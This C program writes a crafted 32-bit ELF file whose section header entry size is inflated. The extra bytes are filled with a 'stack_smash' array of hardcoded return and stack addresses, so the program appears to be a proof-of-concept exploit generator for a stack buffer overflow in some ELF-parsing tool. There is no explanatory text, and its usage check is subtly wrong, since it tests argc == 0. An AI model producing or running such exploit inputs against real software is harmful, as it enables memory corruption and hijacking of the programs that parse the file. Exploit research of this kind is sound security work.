#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include <string.h>

#include <fcntl.h>
#include <unistd.h>

#include <linux/elf.h>

int
main(int argc, const char *argv[])
{
	int fd;
	Elf32_Ehdr hdr;
	Elf32_Shdr shdr;
	char *name = "BLABLABLA";
	uint32_t stack_smash[8] = {
		0x0804b038,
		0x0804b008,
		0x0804b008,
		0x00000002,
		0xdeadbeef,
		0x0000003c,
		0xffffd558,
		0xffffd7aa
	};

	if ( argc == 0 ) {
		printf("usage: %s filename\n", argv[0]);
		exit(1);
	}

	fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0644);

	if ( fd == -1 ) {
		perror("open");
		exit(1);
	}

	// Write Elf header
	memset(&hdr, 0x00, sizeof(hdr));

	hdr.e_shoff = sizeof(hdr);
	hdr.e_shstrndx = 0;
	hdr.e_shnum = 1;
	hdr.e_shentsize = sizeof(shdr) + sizeof(stack_smash);

	write(fd, &hdr, sizeof(hdr));

	// Write first section
	memset(&shdr, 0x00, sizeof(shdr));

	shdr.sh_offset = sizeof(hdr) + sizeof(shdr) + sizeof(stack_smash);
	shdr.sh_size = strlen(name) + 1;
	shdr.sh_name = 0;

	write(fd, &shdr, sizeof(shdr));
	write(fd, &stack_smash, sizeof(stack_smash));

	// Write data
	write(fd, name, strlen(name) + 1);

	return EXIT_SUCCESS;
}
